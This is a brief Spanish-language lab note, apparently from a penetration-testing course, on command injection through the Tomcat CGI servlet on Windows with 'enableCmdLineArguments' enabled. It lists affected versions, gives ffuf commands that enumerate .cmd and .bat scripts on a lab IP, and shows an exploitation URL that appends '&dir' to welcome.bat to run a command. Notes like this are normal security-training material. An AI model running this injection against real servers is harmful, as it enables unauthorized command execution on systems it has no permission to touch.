- Posee una vulnerabilidad en los sistemas Windows que tengan el parametro "enableCmdLineArguments" activado.
- Las versiones afectadas son:
      - 9.0.0.M1 a 9.0.17
      - 8.5.0 a 8.5.39
      - 7.0.0 a 7.0.93


### Enum
##### Buscar cmds:
    ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
##### Bucar bachs:

    ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat

### EXPLOITATION
##### Agregamos como parámetro el comando que queremos correr:
    http://10.129.204.227:8080/cgi/welcome.bat?&dir


si el comando es complicado, deberemos encodear en URL.
